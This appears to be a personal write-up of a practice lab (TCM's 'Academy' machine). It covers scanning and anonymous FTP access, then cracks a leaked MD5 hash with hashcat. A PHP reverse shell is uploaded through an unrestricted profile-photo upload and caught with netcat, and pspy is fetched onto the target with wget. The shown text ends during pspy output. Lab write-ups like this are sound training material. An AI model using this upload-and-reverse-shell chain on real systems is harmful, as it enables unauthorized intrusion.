---
title: Write-up Academy on TCM
author: eMVee
date: 2022-08-18 21:00:00 +0800
categories: [CTF, TCM]
tags: [PNPT, Unrestricted File Upload]
render_with_liquid: false
---


As I am taking The Cyber Mentor's "Pactical Ethical Hacking" course, some vulnerable machines are shared with you so that you can practice the skills taught by Heath Adams.
These machines allow you to practice a few things without breaking any rules or needing permission from an owner. This time, Academy is the target and I start both my Kali VM and the Academy VM.
## PNPT - Academy writeup

After starting my Kali machine I always check my own IP address so I could add it to my notes. I can check this with the following command **ip a**, or something like **hostname -I**
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(emvee㉿kali)-[~]
└─$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:c7:ee:60 brd ff:ff:ff:ff:ff:ff
    inet 192.168.138.4/24 brd 192.168.138.255 scope global dynamic noprefixroute eth0
       valid_lft 525sec preferred_lft 525sec
    inet6 fe80::a00:27ff:fec7:ee60/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

It looks like my own IP address is: 192.168.138.4 which is added to my notes. Since the vulnerable machine "Academy"  was started as well in my lab environment I could rung a ping sweep to identify the targets IP address. There are several commands and tools which can be used. A few of them I will use during this course such as **netdiscover**, **fping**, **arp-scan** and **nmap**. I start with **netdiscover -r 192.168.138.0/24** to identify the IP address of Academy.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(emvee㉿kali)-[~]
└─$ sudo netdiscover -r 192.168.138.0/24


 Currently scanning: Finished!   |   Screen View: Unique Hosts                
                                                                              
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.138.1   52:54:00:12:35:00      1      60  Unknown vendor             
 192.168.138.2   52:54:00:12:35:00      1      60  Unknown vendor             
 192.168.138.3   08:00:27:fb:30:23      1      60  PCS Systemtechnik GmbH     
 192.168.138.5   08:00:27:3e:ea:72      1      60  PCS Systemtechnik GmbH  
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When I look at the scan results, Academy should be running on the following IP address: 192.168.138.5.
The other three IP addresses are from Oracle Virtual Box.

To see if there are no other IP addresses still online, I check this with **fping -ag 192.168.138.0/24 2>/dev/null****.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(emvee㉿kali)-[~]
└─$ fping -ag 192.168.138.0/24 2>/dev/null
192.168.138.1
192.168.138.2
192.168.138.3
192.168.138.4
192.168.138.5
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Also fping shows the same machines, only now my IP address is also in between.

Before I continue with Academy, I'll create a variable for the IP address so that I can easily use a variable in my commands.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip=192.168.138.5
~~~
First, I ping Academy to see if it responds to that as well.

~~~  
┌──(emvee㉿kali)-[~]
└─$ ping -c3 $ip
PING 192.168.138.5 (192.168.138.5) 56(84) bytes of data.
64 bytes from 192.168.138.5: icmp_seq=1 ttl=64 time=0.622 ms
64 bytes from 192.168.138.5: icmp_seq=2 ttl=64 time=0.539 ms
64 bytes from 192.168.138.5: icmp_seq=3 ttl=64 time=0.548 ms

--- 192.168.138.5 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2029ms
rtt min/avg/max/mdev = 0.539/0.569/0.622/0.037 ms
~~~
In the ping response I see a time to live (ttl) value of 64. This to me is a strong indication that this machine contains a Linux distro.

Time to run an aggressive port scan to see what's open on Acedemy.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -p- -A -O $ip 
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 09:20 CEST
Nmap scan report for 192.168.138.5
Host is up (0.00064s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.138.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:3E:EA:72 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.63 ms 192.168.138.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
~~~

The scan results came very quickly and the results are looking very well for an attacker.
There are already several items that I would like to add to my notes.
* Port 21
    * FTP - vsftpd 3.0.3
    * Anonymous login
        * file - note.txt
* Port 22
    * SSH - OpenSSH 7.9p1 Debian
* Port 80
    * HTTP
    * Apache 2.4.38 (debian)
    * Default page
* Debian as Linux distro 

At the moment there is quite a bit of information that has already been found. First, I want to look at the FTP service. In general, it is not easy to find anything on SSH. Sometimes there's a banner with some information, so I'll check that as second. And as third, I'll take a look at the Apache web server.


So first I will log in as anonymous to the FTP server and download the file note.txt to see what it contains.
~~~
┌──(emvee㉿kali)-[~]
└─$ ftp $ip                               
Connected to 192.168.138.5.
220 (vsFTPd 3.0.3)
Name (192.168.138.5:emvee): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12471|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||45953|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |**********************************************************************************************************************************************************************************************|   776       19.46 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (19.12 KiB/s)
ftp> ls -la
229 Entering Extended Passive Mode (|||13568|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 30  2021 .
drwxr-xr-x    2 0        114          4096 May 30  2021 ..
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
~~~
Now that the file is local, I can use the cat command to see what's in it.

~~~~~~~~~~~~~~~~~~~~~
┌──(emvee㉿kali)-[~]
└─$ cat note.txt 
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
~~~~~~~~~~~~~~~~~~~~~
A number of interesting things are mentioned in this file. It is said that the same password should not be used everywhere and that this should be changed as soon as possible. So passwords that are found by me, should be tried in several places on different accounts. The note is for Heath and the website was set up by grimmie, something we should keep in mind.

The SQL insert query also contains some interesting data:
* Student registration number: 10201321
* Password hash: cd73502828457d15655bbd7a63fb0bc8
* Name: Rum Ham
* PIN code: 777777

And it closes with jdelta, this could possibly also be a username.

I would like to crack the hash with hashcat, so I create a text file with the hash in it
~~~                            
┌──(emvee㉿kali)-[~]
└─$ nano password-hash.txt
                                                                                                        
┌──(emvee㉿kali)-[~]
└─$ cat password-hash.txt 
cd73502828457d15655bbd7a63fb0bc8
~~~
Because I suspect that the hash is an MD5 hash, I would like to be able to give this as an option in the hashcat command to crack the password.
~~~
┌──(emvee㉿kali)-[~]
└─$ hashcat -h | grep MD5
      0 | MD5                                                 | Raw Hash
   5100 | Half MD5                                            | Raw Hash
     50 | HMAC-MD5 (key = $pass)                              | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                              | Raw Hash authenticated
  11900 | PBKDF2-HMAC-MD5                                     | Generic KDF
  11400 | SIP digest authentication (MD5)                     | Network Protocol
   5300 | IKE-PSK MD5                                         | Network Protocol
  25100 | SNMPv3 HMAC-MD5-96                                  | Network Protocol
  25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                     | Network Protocol
  10200 | CRAM-MD5                                            | Network Protocol
   4800 | iSCSI CHAP authentication, MD5(CHAP)                | Network Protocol
  19000 | QNX /etc/shadow (MD5)                               | Operating System
   2410 | Cisco-ASA MD5                                       | Operating System
   2400 | Cisco-PIX MD5                                       | Operating System
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)           | Operating System
  11100 | PostgreSQL CRAM (MD5)                               | Database Server
  16400 | CRAM-MD5 Dovecot                                    | FTP, HTTP, SMTP, LDAP Server
  24900 | Dahua Authentication MD5                            | FTP, HTTP, SMTP, LDAP Server
   1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)               | FTP, HTTP, SMTP, LDAP Server
   9700 | MS Office <= 2003 $0/$1, MD5 + RC4                  | Document
   9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1     | Document
   9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2     | Document
  22500 | MultiBit Classic .key (MD5)                         | Cryptocurrency Wallet
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
~~~
The MD5 hash should be cracked with the ```-m 0``` option. To crack the hash I will use the famous rockyou wordlist. The command which I will use looks like this **hashcat -m 0 password-hash.txt /usr/share/wordlists/rockyou.txt **
~~~
┌──(emvee㉿kali)-[~]
└─$ hashcat -m 0 password-hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 14999/30062 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

cd73502828457d15655bbd7a63fb0bc8:student                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: cd73502828457d15655bbd7a63fb0bc8
Time.Started.....: Thu Aug 18 11:05:49 2022 (0 secs)
Time.Estimated...: Thu Aug 18 11:05:49 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    53354 H/s (0.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Util: 98%

Started: Thu Aug 18 11:05:47 2022
Stopped: Thu Aug 18 11:05:50 2022
~~~
So the MD5 hash is the password "student"

On port 21 I noticed that the FTP server runs on vsftpd 3.0.3, so there might be an exploit available for this version. I decide to do a quick search with searchsploit.

~~~
┌──(emvee㉿kali)-[~]
└─$ searchsploit vsftpd
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                                                                           | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                                                                           | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                                                                           | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                                                                         | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                   | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                                                                  | multiple/remote/49719.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
~~~
Only a Remote Denial of Service is available. This is something I'm not looking for right now, so I decide to move on to see if there's anything else to be found on the SSH service.

~~~
┌──(emvee㉿kali)-[~]
└─$ ssh $ip                            
The authenticity of host '192.168.138.5 (192.168.138.5)' can't be established.
ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.138.5' (ED25519) to the list of known hosts.
emvee@192.168.138.5's password: 
~~~
No banner is used, so I only have the option to see if there is an exploit for OpenSSH 7.9p1. I think the chance is small for the moment, but I decide to do a search with searchsploit. 
~~~
┌──(emvee㉿kali)-[~]
└─$ searchsploit openssh 7
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                                                                                                     | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                                                                                                       | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                                                                                                         | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                                                                                                   | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                                                                       | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                                                                               | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                                           | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                                                                        | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                                                                               | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                                                                     | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                                                                     | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                                                                                                               | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                                                                                                     | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                                                                                                          | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                                                  | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                                                     | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                                                             | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                                                                   | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                                                     | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                                 | linux/remote/40963.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                                     | linux/remote/45939.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                                     | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                                                                                                                                               | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                                                                      | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                                                                        | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                                                                    | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                                                                     | multiple/remote/3303.sh
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Paper Title                                                                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Roaming Through the OpenSSH Client: CVE-2016-0777 and CVE-2016-0778                                                                                                                                      | english/39247-roaming-through-th
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
~~~           
               
As expected, there is no exploit directly available to attack the SSH service. Time to move on and take a closer look at the HTTP web server.

Before I open the browser to see what's on the website, I first start a number of tools from the CLI to see what I can discover.
First I start with nikto to see if some vulnerabilities can already be found.

~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip            
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.138.5
+ Target Hostname:    192.168.138.5
+ Target Port:        80
+ Start Time:         2022-08-18 10:10:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5c37b0dee585e, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ Cookie goto created without the httponly flag
+ Cookie back created without the httponly flag
+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 8067 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2022-08-18 10:11:24 (GMT2) (66 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

~~~
It is confirmed by nikto that Apache 2.4.38 is running on a Debian server. I also see that there is also a phpmyadmin directory, which is therefore accessible to everyone.

Time to see which techniques can be found by whatweb.
~~~
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip
http://192.168.138.5 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.138.5], Title[Apache2 Debian Default Page: It works]
~~~
Whatweb confirmed what has been found with nmap and nikto.
I decide to view the website with the browser.
![Image](/assets/img/WriteUp/PNPT/Academy/1.png){: width="700" height="400" }

Indeed there is Apache's default page on a debian server that is present after installation. By default, it is installed in the following location: "/var/www/html". This is also stated on the web page. Because phpmyadmin was also found by nikto I decide to check this in the browser.

![Image](/assets/img/WriteUp/PNPT/Academy/2.png){: width="700" height="400" }

Ant there is a login page for phpMyAdmin as found earlier with nikto. When you click the question mark, you will be taken to phpMyAdmin's documentation.
Here you can see which phpMyAdmin version is being used.

Looks like phpMyAdmin 4.9.7 is being used.
![Image](/assets/img/WriteUp/PNPT/Academy/3.png){: width="700" height="400" }

Since the machine is called academy, I am trying to add a directory /academy in the url "http://192.168.135.5/academy"
![Image](/assets/img/WriteUp/PNPT/Academy/4.png){: width="700" height="400" }

A login screen is shown in which I have to enter a registration number and password. These were in the SQL insert statement in the notes (note.txt) and the password was already cracked with hashcat. So i can try to logon to the web page with those credentials.
![Image](/assets/img/WriteUp/PNPT/Academy/5.png){: width="700" height="400" }

After logging in I get a message that the password needs to be changed. I change the password from "student" to "student". The system accepts this, so I can work with the same password later. In a pentest this would certainly be a finding, because the password policy is not well set up. 
![Image](/assets/img/WriteUp/PNPT/Academy/6.png){: width="700" height="400" }

I decide to click around to see what functionalities are available on the website. 
![Image](/assets/img/WriteUp/PNPT/Academy/7.png){: width="700" height="400" }

Under "MY PROFILE" I see that an profile image can be uploaded. If this image isn't captured properly, you could upload a PHP reverse shell.
By default, there is a PHP reverse shell of pentest monkey available, which I will use to get a reverse shell. To keep the original available, I copy this file to my work directory.
~~~
┌──(emvee㉿kali)-[~/Documents/academy]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
~~~
Then I adjust it so that I can use my IP address and port on which I start a listener.
![Image](/assets/img/WriteUp/PNPT/Academy/8.png){: width="700" height="400" }

Once I save the file, I start the netcat listener on port 1234.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234          
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
~~~

Then I select the file "shell.php" and click the update button.
![Image](/assets/img/WriteUp/PNPT/Academy/9.png){: width="700" height="400" }

Once the file is uploaded and the page is reshed, the reverse PHP webshell is loaded.
So time to look at netcat again.

~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234          
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.138.5.
Ncat: Connection from 192.168.138.5:35002.
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 05:40:06 up  2:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

~~~
A connetion is established and I noticed that I am the user "www-data". One of the commands I use during my post exploitation is **ls /home -ahlR** to see all files and folders in the home directory.
~~~
$ ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root    root          4.0K May 30  2021 .
drwxr-xr-x 18 root    root          4.0K May 29  2021 ..
drwxr-xr-x  3 grimmie administrator 4.0K May 30  2021 grimmie

/home/grimmie:
total 32K
drwxr-xr-x 3 grimmie administrator 4.0K May 30  2021 .
drwxr-xr-x 3 root    root          4.0K May 30  2021 ..
-rw------- 1 grimmie administrator    1 Jun 16  2021 .bash_history
-rw-r--r-- 1 grimmie administrator  220 May 29  2021 .bash_logout
-rw-r--r-- 1 grimmie administrator 3.5K May 29  2021 .bashrc
drwxr-xr-x 3 grimmie administrator 4.0K May 30  2021 .local
-rw-r--r-- 1 grimmie administrator  807 May 29  2021 .profile
-rwxr-xr-- 1 grimmie administrator  112 May 30  2021 backup.sh

/home/grimmie/.local:
total 12K
drwxr-xr-x 3 grimmie administrator 4.0K May 30  2021 .
drwxr-xr-x 3 grimmie administrator 4.0K May 30  2021 ..
drwx------ 3 grimmie administrator 4.0K May 30  2021 share
ls: cannot open directory '/home/grimmie/.local/share': Permission denied

~~~

I noticed as bash script called "backup.sh" which has read, write and execute permissions for the user and read permission for the whole world. Enough reason for me to see what the file does.
~~~
$ cat /home/grimmie/backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip

~~~
The bash file removes a backup archive and creates a new backup archive and sets the permissions afterwards.
I decide to upgrade my shell with python...
~~~
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@academy:/$
~~~
After upgrading my shell a bit, it was time to bring **[pspy](https://github.com/DominicBreuker/pspy)** to the target. TO get this file to the target I use the python webserver with the following command: **sudo python3 -m http.server 80**

~~~
┌──(emvee㉿kali)-[~/transfer]
└─$ sudo python3 -m http.server 80
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
After starting the python webserver, I need to download the file on the target. To do this I have to be able to write the file to a directory. Most of the time the **/tmp** directory could be used to download files. So I changed the working directory and download it to this direcotry.

~~~
www-data@academy:/$ cd /tmp
cd /tmp
www-data@academy:/tmp$ wget http://192.168.138.4/pspy64
wget http://192.168.138.4/pspy64
--2022-08-18 06:45:27--  http://192.168.138.4/pspy64
Connecting to 192.168.138.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.94M  --.-KB/s    in 0.01s   

2022-08-18 06:45:27 (225 MB/s) - 'pspy64' saved [3078592/3078592]

~~~

After downloading the file I had to set the permissions so I could execute the file.


~~~
www-data@academy:/tmp$ chmod +x pspy64
chmod +x pspy64
~~~


~~~
www-data@academy:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/08/18 06:46:42 CMD: UID=0    PID=97     | 
2022/08/18 06:46:42 CMD: UID=0    PID=9      | 
2022/08/18 06:46:42 CMD: UID=0    PID=8      | 
2022/08/18 06:46:42 CMD: UID=33   PID=703    | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=33   PID=702    | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=0    PID=7      | 
2022/08/18 06:46:42 CMD: UID=0    PID=6      | 
2022/08/18 06:46:42 CMD: UID=0    PID=59     | 
2022/08/18 06:46:42 CMD: UID=106  PID=503    | /usr/sbin/mysqld 
2022/08/18 06:46:42 CMD: UID=0    PID=49     | 
2022/08/18 06:46:42 CMD: UID=0    PID=483    | /usr/sbin/apache2 -k start 
2022/08/18 06:46:42 CMD: UID=0    PID=48     | 
2022/08/18 06:46:42 CMD: UID=0    PID=404    | /usr/sbin/sshd -D 
2022/08/18 06:46:42 CMD: UID=0    PID=4      | 
2022/08/18 06:46:42 CMD: UID=0    PID=399    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2022/08/18 06:46:42 CMD: UID=0    PID=393    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2022/08/18 06:46:42 CMD: UID=104  PID=365    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2022/08/18 06:46:42 CMD: UID=0    PID=364    | /lib/systemd/systemd-logind 
